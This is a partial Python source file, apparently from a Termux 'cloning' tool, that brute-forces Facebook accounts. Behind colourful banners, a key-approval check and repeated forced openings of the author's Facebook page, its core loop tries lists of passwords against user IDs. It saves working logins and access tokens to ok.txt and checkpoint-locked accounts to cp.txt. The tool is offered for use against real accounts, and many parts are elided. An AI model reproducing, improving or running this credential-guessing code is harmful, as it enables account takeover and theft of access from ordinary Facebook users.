...
def logo():
 ...
 ───────────────────────────────────────────────────────×
  ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m MR_B1P1N\x1b[0m\x1b[1;97m]
...
def logo2():
	...
	print ("""
d8888b. d888888b d8888b. d888888b d8b   db 
88  `8D   `88'   88  `8D   `88'   888o  88 
88oooY'    88    88oodD'    88    88V8o 88 
88~~~b.    88    88~~~      88    88 V8o88 
88   8D   .88.   88        .88.   88  V888 
Y8888P' Y888888P 88      Y888888P VP   V8P                                                                                      
───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m MR B1P1N\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :2\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : B1P1N-M9G9R \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : L3G3ND.B01.B1P1N \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : B1P1N M9G9R \x1b[0m\x1b[1;97m]
───────────────────────────────────────────────────────× 
 """)
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/LEGENDBOYBIPIN/approval-txt/blob/main/approval.txt"])
	#yahan apni facebook id link dalna
	exit(" [=>] FACEBOOK :  https://www.facebook.com/BIPINHUYWR")
...
def notice():
	...
	runtxt("\n\033[0;97m  Free 2009 cloning Tool For Free Aproval Msg Me In Fb")
	os.system("xdg-open https://www.facebook.com/BIPINHUYWR")
	runtxt("\033[0;97m FOR APPROVAL MSG ME IN FB >> %s%s"%(G,basesplit))
	runtxt("\033[0;97m FOR KEY APPROVAL DIRECT MSG ME IN FB")
	os.system("xdg-open https://www.facebook.com/BIPINHUYWR")
	subprocess.check_output(["am", "start", "https://www.facebook.com/BIPINHUYWR"])
...
class Main:
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://github.com/LEGENDBOYBIPIN/approval-txt/blob/main/approval.txt').text
			if basesplit in plr:
				key = basesplit
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version : 2\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : B1P1N-M9G9R-XD \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : L3G3ND.B01.B1P1N \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m https://www.facebook.com/BIPINHUYWR\x1b[0m\x1b[1;97m]
───────────────────────────────────────────────────────× 
    """)
		print("%s [%s•%s] %sTOOL NAME : %s2009 Cloning Tool"%(G,R,G,B,G))
		print("%s [%s•%s] %sVERSION   : %s2"%(G,R,G,B,G))
		print("%s [%s•%s] %sYOUR KEY  : %s%s"%(G,R,G,B,G,key))
		print("%s [%s•%s] %sSTATUS    : %s"%(G,R,G,B,stat)) 
		print("───────────────────────────────────────────────────────× ")
		print(" \t\033[1;97m[\x1b[1;97m\x1b[1;41m FOLLOW ME ON FB FOR MORE UPDATES \x1b[0m\x1b[1;97m] \033[1;37m ")
		subprocess.check_output(["am", "start", "https://www.facebook.com/BIPINHUYWR"])
		print("───────────────────────────────────────────────────────× ")
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;97m   [=B1P_1N=OK=>] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("   [=B1P_1N=OK=>]  %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;92m   [=B1P_1N=CP=>] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("   [=B1P_1N=CP=>]  %s|%s\n"%(uid, pw))
				break
			else:
				continue

 #B1P1N copy krke apna name dal dyna
